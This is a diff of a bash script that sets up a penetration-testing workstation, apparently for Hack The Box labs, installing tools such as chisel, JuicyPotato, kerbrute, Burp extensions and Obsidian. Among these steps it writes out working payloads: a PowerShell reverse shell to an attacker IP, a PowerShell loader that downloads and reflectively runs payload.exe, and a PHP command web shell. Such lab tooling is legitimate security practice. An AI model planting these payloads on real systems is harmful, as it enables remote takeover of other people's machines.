+curl -SL 'https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz' -o chisel.gz
+gunzip -f -q chisel.gz
+mv chisel chisel.exe
+curl -SL 'https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz' -o chisel.gz
+gunzip -f -q chisel.gz
+chmod +x chisel
+
+
 if [[ ! -f "${HTB_TRANSFERS}/JuicyPotato.exe" ]]; then
   echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}JuicyPotato${RESET}"
   curl -SL 'https://github.com/AyrA/juicy-potato/releases/download/v1.0/JuicyPotato.exe' -o juicypotato.exe
@@ -616,18 +784,26 @@ if [[ ! -f "${HTB_TRANSFERS}/adfind.exe" ]]; then
     $'https://www.joeware.net/downloads/dl2.php' -o adfind.exe
 fi
 
-file="shell-$USER.ps1"
+file="ps-revshell-$USER.ps1"
 cat <<EOF > "${file}"
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+\$client = New-Object System.Net.Sockets.TCPClient("${IP}",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + "# ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
 EOF
 
-file="exec-$USER.ps1"
+file="ps-exec-$USER.ps1"
 cat <<EOF > "${file}"
-$bytes = (new-object net.webclient).downloaddata("http://10.10.14.3:8000/payload.exe")
-[System.Reflection.Assembly]::Load($bytes)
-$BindingFlags = [Reflection.BindingFlags] "Nonpublic,Static"
-$main = [Shell].getmethod("Main", $BindingFlags)
-$main.Invoke($null, $null)
+\$bytes = (new-object net.webclient).downloaddata("http://${IP}:8000/payload.exe")
+[System.Reflection.Assembly]::Load(\$bytes)
+\$BindingFlags = [Reflection.BindingFlags] "Nonpublic,Static"
+\$main = [Shell].getmethod("Main", \$BindingFlags)
+\$main.Invoke($null, $null)
+EOF
+
+file="simple.php"
+cat <<EOF > "${file}"
+<?php
+\$command = shell_exec(\$_REQUEST['cmd']);
+echo \$command;
+?>
 EOF
 
 
@@ -636,7 +812,7 @@ echo -e "\n${GREEN}[*] ${RESET}Centralizing ${BOLD}Burpsuite${RESET} configs, ex
 mkdir -p "${BURPSUITE_CONFIG_DIR}"/{configs,libs,extensions,projects}
 if [[ ! -f "${BURPSUITE_CONFIG_DIR}/libs/jython-2.7.2.jar" ]]; then
   cd "${BURPSUITE_CONFIG_DIR}/libs"
-  # Jython 2.7.2 is still latest version available as of Sept 2, 2021
+  # Jython 2.7.2 is still latest version available as of Apr 28, 2022
   jython_url='https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.2/jython-standalone-2.7.2.jar'
   echo -e "${GREEN}[*] ${RESET}Downloading ${BOLD}Jython${RESET} lib for Burpsuite (Python add-on support)"
   curl -SL "${jython_url}" -o jython-2.7.2.jar
@@ -644,25 +820,47 @@ fi
 
 echo -e "\n${GREEN}[*] ${RESET}Grabbing ${BOLD}Burpsuite${RESET} extensions"
 cd "${BURPSUITE_CONFIG_DIR}/extensions"
-git clone https://github.com/bit4woo/domain_hunter
+#git clone https://github.com/bit4woo/domain_hunter
+install_or_update_git "domain_hunter" "https://github.com/bit4woo/domain_hunter"
 
 # Paramalyzer - analyze a site's parameters; useful on large-scale site testing
-curl -SL "https://github.com/JGillam/burp-paramalyzer/releases/download/v2.0.0/paramalyzer-2.0.0.jar" -o paramalyzer.jar
+curl -SL "https://github.com/JGillam/burp-paramalyzer/releases/download/v2.1.0/paramalyzer-2.1.0.jar" -o paramalyzer.jar
 # Load this up into BurpSuite from: Extender -> Extensions -> Add
 
 
 
 
 # -- Golang & Tools ------------------------------------------------------------
-### Go packages
+declare -A gotools
+gotools["chisel"]="github.com/jpillora/chisel"
+gotools["kerbrute"]="github.com/ropnop/kerbrute"
+#gotools[""]=""
+
 if [[ $(which go) ]]; then
   # Preferred GOPATH for installed tool binaries is $HOME/go/bin
-  echo -e "\n${GREEN}[*] ${RESET}Installing ${BOLD}Go-based${RESET} tools: chisel, kerbrute"
+  #echo -e "\n${GREEN}[*] ${RESET}Installing ${BOLD}Go-based${RESET} tools: chisel, kerbrute"
   GO_VERSION=$(go version | awk '{print $3}' | cut -d 'o' -f2)
   export PATH="$PATH:$HOME/go/bin"
   [[ ! -d "${HOME}/go/bin" ]] && mkdir -p "${HOME}/go/bin"
-  [[ ! $(which chisel) ]] && go get github.com/jpillora/chisel
-  [[ ! $(which kerbrute) ]] && go get github.com/ropnop/kerbrute
+  #[[ ! $(which chisel) ]] && go get github.com/jpillora/chisel
+  #[[ ! $(which kerbrute) ]] && go get github.com/ropnop/kerbrute
+  printf "\n${BLUE}[*] Installing: Golang tools (${#gotools[@]})${RESET}\n\n"
+  go env -w GO111MODULE=auto
+  go_step=0
+  declare -A pkgs_failed
+  for gotool in "${!gotools[@]}"; do
+      go_step=$((go_step + 1))
+      eval GO111MODULE=on go get -v ${gotools[$gotool]} $DEBUG_STD
+      exit_status=$?
+      if [[ $exit_status -eq 0 ]]; then
+          printf "${GREEN}[*] (${go_step}/${#gotools[@]}) $gotool installed ${RESET}\n\n"
+      else
+          printf "${RED}[ERR] (${go_step}/${#gotools[@]}) $gotool failed to install/update ${RESET}\n"
+          double_check=true
+          # Add failed package to our failed array which will output at the end so user knows which ones failed.
+          pkgs_failed+=([$gotool]=${gotools[$gotool]})
+      fi
+  done
 else
   echo -e "${RED}[ERROR] ${ORANGE}Golang/Go${RESET} is missing or not in your PATH. Fix it to get GO pkgs!"
 fi
@@ -740,22 +938,20 @@ function download_torrent() {
 
 # -- Install Obsidian for Notetaking -------------------------------------------
 function install_obsidian_appimage() {
-  if [[ ! $(which obsidian) ]]; then
-    echo -e "${GREEN}[*] ${RESET}Installing and configuring ${BOLD}Obsidian${RESET}, a Markdown-based notetaking app"
-    cd /tmp/
-    url='https://github.com/obsidianmd/obsidian-releases/releases/download/v0.11.9/Obsidian-0.11.9.AppImage'
-    curl -SL "${url}" -o obsidian
-    $SUDO mv /tmp/obsidian /usr/local/sbin/obsidian
-    $SUDO chmod +x /usr/local/sbin/obsidian
-    # First-run but don't create/open a vault yet
-    $SUDO timeout 5 "/usr/local/sbin/obsidian --no-sandbox" >/dev/null 2>&1
-  fi
+  echo -e "${GREEN}[*] ${RESET}Installing and configuring ${BOLD}Obsidian${RESET}, a Markdown-based notetaking app"
+  cd /tmp/
+  url='https://github.com/obsidianmd/obsidian-releases/releases/download/v0.14.6/Obsidian-0.14.6.AppImage'
+  curl -SL "${url}" -o obsidian
+  $SUDO mv /tmp/obsidian /usr/local/sbin/obsidian
+  $SUDO chmod +x /usr/local/sbin/obsidian
+  # First-run but don't create/open a vault yet
+  $SUDO timeout 5 "/usr/local/sbin/obsidian --no-sandbox" >/dev/null 2>&1
+
   # Setup desktop shortcut & icon for Obsidian
-  [[ ! -d "${HOME}/.local/share/icons" ]] && mkdir -p "${HOME}/.local/share/icons"
-  cd "${HOME}/.local/share/icons"
-  curl -SL 'https://onionicons.com/parse/files/macOSicons/f107898bec29e0e6b0500fe2d04405c7_1605605112464_Obsidian.icns' -o obsidian.icns
   file="${HOME}/Desktop/obsidian.desktop"
   if [[ ! -f "${file}" ]]; then
+    [[ ! -d "${HOME}/.local/share/icons" ]] && mkdir -p "${HOME}/.local/share/icons"
+    curl -SL 'https://onionicons.com/parse/files/macOSicons/f107898bec29e0e6b0500fe2d04405c7_1605605112464_Obsidian.icns' -o "${HOME}/.local/share/icons/obsidian.icns"
     cat <<EOF > "${file}"
 [Desktop Entry]
 Name=Obsidian
@@ -768,9 +964,13 @@ StartupNotify=true
 Terminal=false
 Type=Application
 EOF
+    chmod 0555 "${file}"
   fi
-  chmod 0500 "${file}"
+}
+install_obsidian_appimage
 
+
+function install_obsidian_extras() {
   # Install extras for this workflow
   # for later, evince permissions error: https://askubuntu.com/questions/1184743/evince-document-viewer-theme-parssing-error-causes-invisible-gui-when-custom-gtk
   $SUDO apt-get -y install evince pandoc p7zip-full
@@ -838,7 +1038,6 @@ pandoc \$1 \\
   --metadata=author:"$USER" \\
   --metadata=date:"\$TDATE"
 
-
 if [[ \$? -eq 0 ]]; then
   evince \$2 &
 fi
@@ -846,13 +1045,13 @@ EOF
     chmod u+x "${file}"
   fi
 }
-[[ "$update" != true ]] && install_obsidian_appimage
+[[ "$update" != true ]] && install_obsidian_extras
 
 
 
 
 # -- Desktop Display Tweaks ----------------------------------------------------
-function desktop_tweaks() {
+function configure_desktop_tweaks() {
   # Apply a few customizations to standard kali desktop, like shortcuts in taskbar
   # and on the desktop.
   if [[ ${GDMSESSION} == 'lightdm-xsession' ]]; then
@@ -888,7 +1087,7 @@ function desktop_tweaks() {
 
   fi
 }
-[[ "$update" != true ]] && desktop_tweaks
+[[ "$update" != true ]] && configure_desktop_tweaks
 
 
 # -- Firefox -------------------------------------------------------------------
